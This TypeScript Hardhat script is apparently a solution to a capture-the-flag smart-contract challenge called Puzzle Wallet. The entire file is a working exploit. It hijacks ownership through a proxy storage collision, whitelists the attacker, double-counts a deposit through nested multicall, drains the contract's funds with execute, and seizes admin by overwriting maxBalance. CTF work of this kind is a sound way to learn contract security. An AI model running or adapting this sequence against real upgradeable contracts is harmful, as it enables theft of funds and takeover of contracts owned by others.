import { TransactionResponse } from "@ethersproject/providers";
import { fail } from "assert";
import { ethers } from "hardhat";

const iface = new ethers.utils.Interface([
  "function owner() view returns (address)",
  "function whitelisted(address _whiteListed) view returns (bool)",
  "function addToWhitelist(address addr)",
  "function setMaxBalance(uint256 _maxBalance)",
  "function multicall(bytes[] calldata data) payable",
  "function deposit() payable",
  "function execute(address to,uint256 value,bytes calldata data) payable",
]);
let calldata: string;

let tx: TransactionResponse;
const VALUE = ethers.utils.parseEther("0.001");

async function puzzleWalletHack() {
  const PUZZLE_WALLET_ADDRESS = process.env.PUZZLE_WALLET_ADDRESS || fail("PUZZLE_WALLET_ADDRESS Not Found In .env");
  const proxy = await ethers.getContractAt("PuzzleProxy", PUZZLE_WALLET_ADDRESS);
  const [attacker] = await ethers.getSigners();
  const attackerAddress = await attacker.getAddress();

  // propose attacker as new admin
  // this will set owner variable of PuzzleWallet to attacker address
  tx = await proxy.connect(attacker).proposeNewAdmin(attackerAddress);
  await tx.wait(1);
  console.log("New pending admin set : ", await proxy.pendingAdmin());

  // whitelist attacker address using proxy delegatecall
  calldata = iface.encodeFunctionData("addToWhitelist", [attackerAddress]);
  tx = await attacker.sendTransaction({ to: proxy.address, data: calldata });
  await tx.wait(1);
  console.log("Set attacker to whitelist");

  // call multicall passing call data for deposit and multicall
  // inside inner multicall pass call data for execute
  const depositFnCall = iface.encodeFunctionData("deposit");
  const depositCall: string[] = [];
  depositCall[0] = depositFnCall;

  const calls: string[] = [];
  calls[0] = depositFnCall;
  calls[1] = iface.encodeFunctionData("multicall", [depositCall]);

  tx = await attacker.sendTransaction({
    to: proxy.address,
    data: iface.encodeFunctionData("multicall", [calls]),
    value: VALUE,
  });
  await tx.wait(1);
  console.log("multicall executed");

  // call execute to drain the balance
  tx = await attacker.sendTransaction({
    to: proxy.address,
    data: iface.encodeFunctionData("execute", [
      attackerAddress,
      ethers.utils.parseEther("0.002"),
      ethers.utils.formatBytes32String(""),
    ]),
  });
  await tx.wait(1);
  console.log("Funds drained from PuzzleWallet");

  // set maxBalance as your address
  tx = await attacker.sendTransaction({
    to: proxy.address,
    data: iface.encodeFunctionData("setMaxBalance", [attackerAddress]),
  });
  await tx.wait(1);
  console.log("Set maxBalance/admin to attacker address");

  console.log("SUCCESS!!! Submit the instance.");
}

puzzleWalletHack().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
